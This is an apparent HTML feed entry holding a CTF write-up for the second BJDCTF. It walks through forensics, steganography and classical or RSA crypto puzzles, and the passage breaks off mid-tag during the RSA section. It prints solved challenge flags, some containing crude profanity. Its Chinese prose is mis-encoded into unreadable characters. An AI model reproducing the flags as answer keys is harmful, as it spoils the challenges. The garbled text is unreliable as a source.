        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç¬¬äºŒå±ŠBJDCTFéƒ¨åˆ†é¢˜ç›®çš„writeup!tcl!</p><a id="more"></a><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="æœ€ç®€å•çš„misc"><a href="#æœ€ç®€å•çš„misc" class="headerlink" title="æœ€ç®€å•çš„misc"></a>æœ€ç®€å•çš„misc</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯secret.zipï¼Œzipä¼ªåŠ å¯†ï¼Œæœç´¢æ ‡å¿—ä½<code>14 00 09 00</code>å°†å…¶æ›¿æ¢æˆ<code>14 00 00 00</code></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321180401.png" style="zoom:80%;"><p>è§£å‹å¾—åˆ°secretï¼Œhexç¼–è¾‘å™¨æŸ¥çœ‹å‘ç°æ˜¯pngå›¾ç‰‡æ ¼å¼ç¡®å°‘æ–‡ä»¶å¤´</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321180736.png" style="zoom:80%;"><p>å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å°¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)æ–‡ä»¶å¤´ï¼šFFD8FFæ–‡ä»¶å°¾ï¼šFF D9ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</span><br><span class="line">PNG (png)æ–‡ä»¶å¤´ï¼š89504E47æ–‡ä»¶å°¾ï¼šAE 42 60 82</span><br><span class="line">GIF (gif)æ–‡ä»¶å¤´ï¼š47494638æ–‡ä»¶å°¾ï¼š00 3B                                               ZIP Archive (zip)æ–‡ä»¶å¤´ï¼š504B0304æ–‡ä»¶å°¾ï¼š50 4B</span><br><span class="line">RAR Archive (rar)æ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)æ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)æ–‡ä»¶å¤´ï¼š41564920</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬è¡¥ä¸Š<code>89 50 4E 47</code></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321181412.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321181522.png" style="zoom:50%;"><p>16è¿›åˆ¶è½¬ASCIIå°±å¾—åˆ°flagäº†</p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯<code>Misc-A_Beautiful_Picture-DreamerJack.png</code></p><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ”¹é«˜åº¦ï¼Œç›´æ¥çœ‹åˆ†è¾¨ç‡ä¹Ÿèƒ½çœ‹å‡ºç‚¹çŒ«è…»</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321182019.png"></p><p>hxdæ‰“å¼€,ç›´æ¥æ”¹å°±èƒ½å¾—åˆ°flag</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321182243.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321182509.png" style="zoom:50%;"><h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>ä¸‹è½½ä¸‹æ¥ezbb.jpgï¼Œforemoståˆ†ç¦»å‡º<code>00000061.zip</code>ï¼Œè§£å‹å¾—åˆ°<code>é‡Œé¢éƒ½æ˜¯å‡ºé¢˜äºº.jpg</code></p><p>å‘ç°å¯ä»¥ç”¨è§†é¢‘æ’­æ”¾å™¨æ’­æ”¾ï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°äº†4å¼ äºŒç»´ç ï¼Œåˆ†åˆ«æˆªå±ä¸‹æ¥æ‰«ä¸‹ï¼Œå¾—åˆ°4ä¸ª16è¿›åˆ¶å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">424A447B696D</span><br><span class="line">316E677D</span><br><span class="line">6167696E5F6C6F76655F59424A447B696D316E677D</span><br><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="å°å§å§"><a href="#å°å§å§" class="headerlink" title="å°å§å§"></a>å°å§å§</h3><p>è¿™é¢˜åº”è¯¥æ˜¯æœ€ç®€å•çš„ï¼Œæƒ³äº†åŠå¹´ï¼Œæˆ‘è¿™è„‘å­ï¼</p><p>ç›´æ¥stringså‘½ä»¤æˆ–è€…Hxdæ‰“å¼€å°±èƒ½æ‰¾åˆ°ï¼Œåº”è¯¥æœç´¢çš„ï¼Œå“ï¼è¦ä»”ç»†å•Šï¼</p><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯<code>ezbb_r.png</code>ï¼Œformoståˆ†ç¦»å‡ºæ¥<code>00000000.jpg</code></p><p>ä¸¤å›¾ç‰‡éƒ½ä¸€æ ·ä¹Ÿèƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œä½†å¤§å°ä¸ä¸€æ ·ï¼Œhxdå¯¹æ¯”ä¸€ä¸‹,å‘ç°å¤šäº†ä¸‹é¢å†…å®¹</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321222554.png" style="zoom:80%;"><p>å•ç‹¬åˆ†æä¸€ä¸‹ï¼Œå‘ç°æœ‰<code>50 4B</code>å¾ˆæ˜æ˜¾æ˜¯å‹ç¼©åŒ…ï¼Œ<code>FF</code>æ˜¯å¤šä½™çš„åˆ æ‰ï¼ŒåŠ ä¸Šzipçš„å¤´<code>50 4B 03 04</code>,ç»“æœå¦‚ä¸‹å›¾</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321222934.png" style="zoom:80%;"><p>è§£å‹å¾—åˆ°hintï¼Œæ‰“å¼€éƒ½æ˜¯#,åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ç¥ä¹ˆåŠ å¯†å‘¢ï¼Œä»”ç»†ä¸€ç…æ˜¯äºŒç»´ç </p><p>ä¸è¿‡å¥½åƒæ‰«ä¸äº†ï¼Œçœ‹çŸ¥ä¹å¤§ä½¬çš„åšæ³•æ˜¯å°†#æ›¿æ¢æˆâ– ï¼Œåœ¨sublimeé‡Œè™½ç„¶å¤§äºŒç»´ç æ‰«ä¸äº†ï¼Œä½†å³è¾¹çš„å°äºŒç»´ç èƒ½æ‰«å‡ºæ¥</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321232911.png" style="zoom:80%;"><p>ä¸ç”¨æ›¿æ¢ä¹Ÿèƒ½æ‰«ï¼ŒsublimeçœŸå¥½,æ‰«å‡ºæ¥æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od -vtx1 ./draw.png | head -56 | tail -28</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥å‘½ä»¤ï¼Œå‘ç°</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200323233100.png" style="zoom:80%;"><p>çœ‹åˆ°æœ‰å¥½å¤š00 ffï¼ŒæŠŠ00æ›¿æ¢ä¸ºç©ºä¼šå‘ç°</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200323233517.png" style="zoom:67%;"><p>å¾—åˆ°flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure><h3 id="åœ£ç«æ˜­æ˜­"><a href="#åœ£ç«æ˜­æ˜­" class="headerlink" title="åœ£ç«æ˜­æ˜­"></a>åœ£ç«æ˜­æ˜­</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŸ¥çœ‹è¯¦ç»†å±æ€§å‘ç°æœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–°ä½›æ›°ï¼šè«¸å£½éš¸åƒ§å£½é™å½å£½è«¸å£½é™€å£½æ‘©éš¸åƒ§ç¼½è–©é¡˜å¿ƒå£½å’¤å£½å›‰å¯‚å£½é—è«¸å£½å“†å£½æ…§å£½èå£½è‰²å½æ„å£½æ‰€å£½èœœå¦‚</span><br></pre></td></tr></table></figure><p>è§£å¯†ç½‘å€ï¼š<a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p><p>è§£å¯†å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gemlove</span><br></pre></td></tr></table></figure><p>æç¤ºå¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é çŒœ</p><p>outgessè§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r sheng_huo_zhao_zhao.jpg -k gemlove -t 1.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure><h3 id="TARGZ"><a href="#TARGZ" class="headerlink" title="TARGZ"></a>TARGZ</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯<code>hW1ES89jF.tar.gz</code>ï¼ŒfileæŸ¥çœ‹å‘ç°æ˜¯zipï¼Œä¸çŸ¥é“å¯†ç ï¼Œæ‹¿æ–‡ä»¶åè¯•ä¸‹</p><p>å‘ç°è§£å‹å‡ºæ¥äº†ï¼Œè¿˜æ˜¯zipåŠ å¯†æ–‡ä»¶ï¼Œå¯†ç è¿˜æ˜¯æ–‡ä»¶å</p><p>ç›—ç”¨ä¸€ä¸‹é¢–å¥‡å¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">aa = os.popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">filename = aa.read().replace(<span class="string">&#x27;decompress.py&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = filename.replace(<span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">kind = filetype.guess(filename)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">if</span> kind.extension <span class="keyword">is</span> <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.zip&quot;</span>.format(filename, a))</span><br><span class="line">os.system(<span class="string">&quot;unzip -P &#123;&#125; &#123;&#125;.zip&quot;</span>.format(a,a))</span><br><span class="line">os.system(<span class="string">&quot;rm *.zip&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wow_you_can_rea11y_dance&#125;</span><br></pre></td></tr></table></figure><h3 id="å¼€åœºæ›²"><a href="#å¼€åœºæ›²" class="headerlink" title="å¼€åœºæ›²"></a>å¼€åœºæ›²</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯mp4ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯mikutapï¼Œå¬åŠ›é¢˜ï¼Œå¹²å°±å®Œäº‹äº†</p><p>çœŸä¸å¥½å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="è€æ–‡ç›²äº†"><a href="#è€æ–‡ç›²äº†" class="headerlink" title="è€æ–‡ç›²äº†"></a>è€æ–‡ç›²äº†</h3><p>æ‰“å¼€å‘ç°æ˜¯ç¹ä½“å­—,ä¸€ä¸ªä¸€ä¸ªæœå‘ç°æ˜¯flagçš„æ‹¼éŸ³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç½¼é›§ç· çœ”æ“´çæ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µçœ”é¹é°</span><br><span class="line">bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da kuo hao</span><br><span class="line">BJD&#123;è¿™å°±æ˜¯flagç›´æ¥äº¤äº†å§&#125;</span><br><span class="line">BJD&#123;æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ&#125;</span><br></pre></td></tr></table></figure><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>gifå›¾ç‰‡å‘ç°æ˜¯æœ‰è§„å¾‹çš„ï¼Œæ¯è¡Œåˆšå¥½å…«ä¸ªç©ºï¼Œç¬¦åˆäºŒè¿›åˆ¶</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200322094932.png" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01000010 42</span><br><span class="line">01001010 4a</span><br><span class="line">01000100 44</span><br><span class="line">01111011 7b</span><br><span class="line">01001101 4d</span><br><span class="line">00100001 21</span><br><span class="line">01100001 61</span><br><span class="line">00110000 30</span><br><span class="line">01111110 7e</span><br><span class="line">01111101 7d</span><br><span class="line">424a447b4d2161307e7d</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure><h3 id="çµèƒ½ç²¾é€š"><a href="#çµèƒ½ç²¾é€š" class="headerlink" title="çµèƒ½ç²¾é€š"></a>çµèƒ½ç²¾é€š</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯jpgï¼Œæœäº†ä¸‹æ˜¯åœ£å ‚æ­¦å£«å¯†ç (Templar Cipher)ï¼Œæœ‰ä»¥ä¸‹è§„åˆ™</p><img src="/2020/03/21/BJDCTF-2rd-writeup/14907757625323.jpg!33.jpg" style="zoom:80%;"><p>å¯¹ç…§ç€ç¿»è¯‘ä¸€ä¸‹</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200322095756.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IMKNIGHTSTEMPLAR</span><br></pre></td></tr></table></figure><p>åŠ ä¸Šflag{}æäº¤å°±è¡Œ</p><h3 id="ç‡•è¨€ç‡•è¯­"><a href="#ç‡•è¨€ç‡•è¯­" class="headerlink" title="ç‡•è¨€ç‡•è¯­"></a>ç‡•è¨€ç‡•è¯­</h3><p>ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè½¬å­—ç¬¦ï¼Œåé¢å¾ˆåƒflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br><span class="line"></span><br><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure><p>ç»´å‰å°¼äºšå¯†ç ,keyæ˜¯yanzi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure><h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯è¯é¢‘åˆ†æ</p><p>quipqiupç½‘å€ï¼š<a href="https://quipqiup.com/">https://quipqiup.com/</a></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200324124416.png" style="zoom:80%;"><p>å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure><p>è¯»ä¸‹åŸæ–‡å‘ç°å‘ç°networyä¹‹ç±»çš„å•è¯ï¼Œæ˜¯è¯´networkï¼Œæ‰€ä»¥yå˜k</p><p>ç›´æ¥è¯»ä¹Ÿå‘ç° cracy è¿™ä¸ªå•è¯ä¸å¯¹åŠ²ï¼Œåº”è¯¥å’Œæš´åŠ›ç ´è§£æ˜¯åŒç±»å‹çš„è¯ï¼Œæ‰€ä»¥æ”¹æˆ Cr4ck</p><p>æœ€ç»ˆflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA0"><a href="#RSA0" class="headerlink" title="RSA0"></a>RSA0</h3><p>è¿˜æ˜¯åšåšå§ï¼Œå¯†ç å­¦å¾ˆé‡è¦</p><p>ncè¿ä¸Šä¹‹åå¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e&#x3D;9253957</span><br><span class="line"></span><br><span class="line">p+q&#x3D;17197527204660991016930035408263123809040259877847603169542637378767706716259296178344873534778882815738410150250641562554942554918768482130124973070602070</span><br><span class="line"></span><br><span class="line">p-q&#x3D;3283501127743182851935633688746582507377540025586758980645892783208704644171247118527903889977325160707479059917010713382755395132590641870700044646202392</span><br><span class="line"></span><br><span class="line">c&#x3D;30471926191609574952020582344350552307428327163031930955084335343130571238539821732378881111036918563115746281652391681966650016526753032232063719399910844180688651845390340809415668659489594779658849946746379795794343633651023334497181833824386697589969010288147535772453380700224010501799051558826899635431</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure><p>å…ˆä»‹ç»ä¸€ä¸‹RSAç®—æ³•ï¼ŒRSAç®—æ³•æ¶‰åŠä¸‰ä¸ªå‚æ•°ï¼ŒNï¼Œeï¼Œdï¼Œå…¬é’¥ä¸º(Nï¼Œe)ï¼Œç§é’¥ä¸º(Nï¼Œd)ï¼Œå…¶ä¸­Næ˜¯ä¸¤ä¸ªå¤§ç´ æ•°pï¼Œqçš„ä¹˜ç§¯ã€‚</p><p><strong>åŠ å¯†è¿‡ç¨‹ï¼š</strong></p><p>é¦–é€‰å–ä¸¤ä¸ªäº’è´¨æ•° <strong>p</strong> <strong>q</strong>ï¼Œé‚£ä¹ˆ<strong>p * q</strong> å¾—åˆ° <strong>N</strong>ï¼Œè¿™æ—¶è¦è®¡ç®—å‡º<strong>Ï†(N)</strong><br>Ï†å‡½æ•°Ï†(N)æ˜¯æŒ‡å°äºæˆ–ç­‰äºNçš„æ­£æ•´æ•°ä¸­ä¸Näº’è´¨çš„æ•°çš„æ•°ç›®ã€‚</p><p>æ ¹æ®æ¬§æ‹‰å…¬å¼ï¼Œå‰æ<strong>p</strong> <strong>q</strong>éƒ½æ˜¯è´¨æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ï†(N) &#x3D; (p-1)*(q-1)</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•°<strong>e</strong>ï¼Œæ¡ä»¶æ˜¯1&lt; e &lt; Ï†(n)ï¼Œä¸”eä¸Ï†(n) äº’è´¨</p><p>æ¥ç€è®¡ç®—<strong>e</strong>å¯¹**Ï†(n)**çš„æ¨¡é€†å…ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d â‰¡ 1 (mod Ï†(n))</span><br></pre></td></tr></table></figure><p>â‰¡æ˜¯æ•°è®ºä¸­è¡¨ç¤ºåŒä½™çš„ç¬¦å·ï¼Œå¯ä»¥çœ‹åˆ°ç¬¦å·å³è¾¹æ’ç­‰äº1ï¼Œå³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(e*d) mod Ï†(n)&#x3D;1</span><br></pre></td></tr></table></figure><p>ç®€å•çš„è¯´å°±æ˜¯ <strong>e*d</strong>é™¤ä»¥**Ï†(N)**å¾—åˆ°çš„ä½™æ•°ä¸º1ï¼Œå¯ä»¥è½¬åŒ–ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d - 1 &#x3D; kÏ†(n)</span><br></pre></td></tr></table></figure><p>è¿™æ—¶ä¾¯æˆ‘ä»¬åªæœ‰k,dä¸çŸ¥é“ï¼Œå¯ä»¥ç”¨è¾—è½¬ç›¸é™¤æ³•æ¥è®¡ç®—ï¼Œç¥é­”æ˜¯è¾—è½¬ç›¸é™¤æ³•å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ¯”å¦‚è¯´ä¸€ä¸ªä¸å®šæ–¹ç¨‹3x+5y&#x3D;28,æˆ‘ä»¬è¦æ±‚å…¶æ•´æ•°è§£</span><br><span class="line">ç”¨å¤§çš„æ•°é™¤ä»¥å°çš„æ•°5&#x3D;3*1+2  --&gt;ä½™æ•°2&#x3D;5-3*1</span><br><span class="line">ç„¶åå†ç”¨ä½™æ•°ä¸åŸæ¥çš„é™¤æ•°ç›¸é™¤ä»¥ï¼Œè¿˜æ˜¯å¤§çš„é™¤ä»¥å°çš„3&#x3D;2*1+1--&gt;ä½™æ•°1&#x3D;3-2*1</span><br><span class="line">æ­¤æ—¶å‘ç°é™¤æ•°2(åŸæ¥çš„ä½™æ•°)ä¸ä½™æ•°1å¯ä»¥æ•´é™¤ï¼Œåœæ­¢é™¤æ³•</span><br><span class="line">2æ˜¯ç”±ç¬¬ä¸€æ­¥æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å€’æ¨å›å»</span><br><span class="line">1&#x3D;3-2*1&#x3D;3-(5-3*1)*1&#x3D;3-5+3*1&#x3D;3*2-5å³3*2-5&#x3D;1</span><br><span class="line">ç­‰å·ä¸¤ç«¯åŒä¹˜ä»¥28</span><br><span class="line">28*2*3+28*(-1)*5&#x3D;28</span><br><span class="line">56*3+(-28)*5&#x3D;28</span><br><span class="line">x&#x3D;56 y&#x3D;-28  ç‰¹è§£</span><br></pre></td></tr></table></figure><p>åŒæ ·æˆ‘ä»¬ä¹Ÿèƒ½æ±‚å‡ºæ¨¡é€†å…ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆå¯¹ä½™æ•°è¿›è¡Œè¾—è½¬ç›¸é™¤ï¼š</span><br><span class="line">N &#x3D; A * a0 + r0</span><br><span class="line">A &#x3D; r0 * a1 + r1</span><br><span class="line">r0 &#x3D; r1 * a2 + r2</span><br><span class="line">r1 &#x3D; r2 * a3 + r3</span><br><span class="line">â€¦</span><br><span class="line">rn-2 &#x3D; rn-1 * an + rn</span><br><span class="line">rn-1 &#x3D; rn * an+1 + 0</span><br></pre></td></tr></table></figure><p>å¯¹ä¸Šé¢çš„å•†æ•°é€†å‘æ’åˆ—ï¼ˆä¸å«ä½™æ•°ä¸º0çš„å•†æ•°ï¼‰ï¼š</p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114162215283.png" style="zoom:80%;"><p>å…¶ä¸­ï¼š<br>b-1 = 1<br>b0 = an<br>bi = an-1 * bi-1 + bi-2<br>å¦‚æœnä¸ºå¥‡æ•°ï¼ˆå³å•†ä¸ªæ•°ä¸ºå¶æ•°ï¼‰ï¼Œåˆ™bnå³ä¸ºæ‰€æ±‚çš„é€†å…ƒBï¼›<br>å¦‚æœnä¸ºå¶æ•°ï¼ˆå³å•†ä¸ªæ•°ä¸ºå¥‡æ•°ï¼‰ï¼Œåˆ™N-bnå³ä¸ºæ‰€æ±‚çš„é€†å…ƒBã€‚</p><p><strong>ä¸¾ä¸¤ä¸ªä¾‹å­ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ±‚61å…³äºæ¨¡105çš„é€†ã€‚å…ˆå¯¹ä½™æ•°è¾—è½¬ç›¸é™¤ï¼š</span><br><span class="line">105 &#x3D; 61 * 1 + 44</span><br><span class="line">61 &#x3D; 44 * 1 + 17</span><br><span class="line">44 &#x3D; 17 * 2 + 10</span><br><span class="line">17 &#x3D; 10 * 1 + 7</span><br><span class="line">10 &#x3D; 7 * 1 + 3</span><br><span class="line">7 &#x3D; 3 * 2 + 1</span><br><span class="line">3 &#x3D; 1 * 3 + 0</span><br></pre></td></tr></table></figure><p>å°†å•†æ•°é€†åºæ’åˆ—ï¼š</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163426852.png"></p><p>ç”±äºå•†çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œå› æ­¤31å³ä¸º61å…³äºæ¨¡105çš„é€†å…ƒã€‚(31 * 61 = 105 * 18 + 1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ±‚31å…³äºæ¨¡105çš„é€†ï¼Œå…ˆå¯¹ä½™æ•°è¾—è½¬ç›¸é™¤ï¼š</span><br><span class="line">105 &#x3D; 31 * 3 + 12</span><br><span class="line">31 &#x3D; 12 * 2 + 7</span><br><span class="line">12 &#x3D; 7 * 1 + 5</span><br><span class="line">7 &#x3D; 5 * 1 + 2</span><br><span class="line">5 &#x3D; 2 * 2 + 1</span><br><span class="line">2 &#x3D; 1 * 2 + 0</span><br></pre></td></tr></table></figure><p>å°†å•†æ•°é€†åºæ’åˆ—ï¼š</p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163834643.png" style="zoom:80%;"><p>ç”±äºå•†çš„ä¸ªæ•°ä¸ºå¥‡æ•°ï¼Œå› æ­¤105-44=61å³ä¸º31å…³äº105çš„é€†å…ƒ</p><p>çŸ¥é“æ¨¡é€†å…ƒæ€æœ«æ±‚å¾—äº†ï¼Œç„¶åæˆ‘ä»¬å°±è¿›è¡ŒåŠ å¯†å—ï¼Œmæ˜¯æ˜æ–‡ï¼Œcæ˜¯å¯†æ–‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 